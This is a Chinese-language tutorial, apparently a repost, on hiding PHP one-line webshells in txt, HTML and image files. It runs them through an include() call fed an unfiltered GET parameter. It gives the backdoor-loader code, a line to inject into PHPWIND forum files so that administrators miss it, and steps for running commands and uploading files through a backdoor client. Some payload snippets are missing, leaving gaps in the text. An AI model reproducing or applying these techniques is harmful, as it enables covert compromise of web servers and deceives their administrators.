
　　最近非常多朋友都在问我是否能把我那一句话木马隐藏到HTML或图片里，其实把一句话木马插入到PHP文件中就已非常隐蔽了，如果说硬是要放到HTML文件或图片里，就接着往下看这篇的篇测试报告吧。要知道如果光把PHP语句放到图片里是无论怎么也不能执行的，因为PHP只解析扩展名为php的文件。所以说要能使隐藏在图片里的PHP语句执行。我们就的借助PHP中的调用函数 ：include 、require 等。

　　我们还记得前些日子把木马隐藏到图片的文章吧。也就是在PHP文件里用include("x.gif")这样的语句来调用隐藏在图片的木马语句。ASP中语句也类似。看似非常隐蔽但直接调用图片对稍微懂点PHP的人就不难发现可疑之处。由于URL 里用GET方式非常难传递参数，这就使得插入木马的性能得不到发挥。

　　include 函数在PHP中使用的比较频繁，所以引起的安全问题也实在太多，例如PHPWIND1.36的漏洞就是因为include后面的变量没做过滤引起的。由此我们就能构造类似的语句来插入到PHP文件中。然后把木马隐藏到图片或HTML文件里，能说隐蔽性就更高了。如在PHPWIND论坛里插入下面的语句：<‘’?@include includ/.$PHPWIND_ROOT;? > 一般管理员是无法看出来的。

　　有了include 函数来辅助帮忙我们就能把PHP木马隐藏到 诸如 txt、html和图片文件等非常多类型的文件里来了。因为txt、html和图片文件这三种类型的文件最无论在论坛还是文章系统里是最为常见的了，下面我们就依次来做测试。

　　首先建立一PHP文件test.php 文件内容为:

　　$test=$_GET['test'];

　　@include 'test/'.$test;

　　?>

　　Txt文件一般都是说明文件，所以我们把一句话木马放到目录的说明文件里就OK了。随便建立一个TXT文件t.txt。我们把一句话木马粘贴到t.txt文件里。然后访问http://localhost/test/test.php?test=../t.txt如果你看到t.txt的内容就证实Ok了， 然后把在lanker微型PHP后门客户端 木马地址添入http://localhost/test/test.php?test=../t.txt密码里添入cmd就能了，执行返回的结果都能看到。

　　对于HTML的文件，一般都为模版文件。为了使插入到HTML的文件的木马能被调用执行而且不被显示出来，我们能在HTML里加入一个隐藏属性的文本框 ，如： 然后使用方法同上。执行的返回结果一般都能查看源文件看到。 如使用查看本程式目录功能。我能得到目录为 C:Uniserver2_7swww	est。

　　	

　　下面我们说说图片文件，要说最为毒的一招莫过于把木马隐藏到图片里。我们能直接对一个图片进行编辑，把插入到图片末尾

　　经测试一般都不会对图片造成影响。然后同样方法客户端木马地址添入

　　我们查看PHP环境变量 返回的是结果是原图片。

　　这里可能要和我们想象的结果有些差距了，其实命令已运行了，只是返回的结果看不到而已，因为这是真正的GIF文件，所以是不会显示返回结果的，为了证实是否真的执行了命令，我们执行上传文件命令。果不出所料，文件已成功上传到服务器上。这样伪造的好处是隐蔽性好。缺点也自然不用说了是没回显。如果你想看到返回的结果，那就拿出记事本伪造一个假的图片文件吧。

　　到这里就基本测试完了，怎样隐蔽PHP后门就看你自己的选择了。

以上内容由 华夏名网 搜集整理，如转载请注明原文出处，并保留这一部分内容。